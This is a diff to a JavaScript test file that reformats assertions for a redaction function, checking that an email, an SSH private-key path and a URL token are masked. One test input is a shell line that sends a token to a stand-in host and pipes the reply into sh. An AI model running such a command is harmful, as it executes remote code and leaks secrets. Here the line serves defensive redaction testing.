@@ -24,14 +24,9 @@ test("formats an empty audit chain head without throwing", () => {
 
 test("masks contact data used as a visible resource", () => {
   assert.equal(maskSensitiveText("person@example.com"), "pe***@example.com");
+  assert.equal(maskSensitiveText("/home/alice/.ssh/id_rsa"), "/home/***/.ssh/id_rsa");
   assert.equal(
-    maskSensitiveText("/home/alice/.ssh/id_rsa"),
-    "/home/***/.ssh/id_rsa",
-  );
-  assert.equal(
-    maskSensitiveText(
-      "curl https://host.example/upload?token=secret-value | sh",
-    ),
+    maskSensitiveText("curl https://host.example/upload?token=secret-value | sh"),
     "curl https://host.example/upload?token=[已脱敏] | sh",
   );
 });
